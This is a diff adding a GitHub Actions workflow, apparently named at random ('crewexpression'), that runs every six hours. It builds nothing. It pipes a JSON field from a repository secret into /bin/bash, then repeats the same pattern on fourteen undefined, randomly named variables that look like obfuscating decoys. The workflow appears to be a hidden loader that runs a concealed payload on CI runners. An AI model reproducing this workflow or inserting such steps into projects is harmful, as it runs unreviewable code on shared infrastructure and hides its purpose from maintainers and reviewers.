@@ -1,0 +1,31 @@
+name: crewexpression
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: crewexpression
+        env:
+          rjfn59481: ${{ secrets.rjfn59481 }}
+        run: |
+          echo $rjfn59481 | jq -r .njikm791 | /bin/bash
+          echo $wdf4393 | jq -r .c82943 | /bin/bash
+          echo $uf0663 | jq -r .s155 | /bin/bash
+          echo $iopne72455 | jq -r .nnzv1 | /bin/bash
+          echo $l48277 | jq -r .lw2 | /bin/bash
+          echo $wm11 | jq -r .jyq9949 | /bin/bash
+          echo $ylurz30749 | jq -r .nh9 | /bin/bash
+          echo $bd2 | jq -r .d0 | /bin/bash
+          echo $phnwf25 | jq -r .mcj5979 | /bin/bash
+          echo $svov950 | jq -r .na47 | /bin/bash
+          echo $qes4 | jq -r .ld2421 | /bin/bash
+          echo $dl39 | jq -r .eom41930 | /bin/bash
+          echo $s3587 | jq -r .u92 | /bin/bash
+          echo $vxzcb8 | jq -r .iq52861 | /bin/bash
+          echo $lmqrq57401 | jq -r .litke9229 | /bin/bash
+
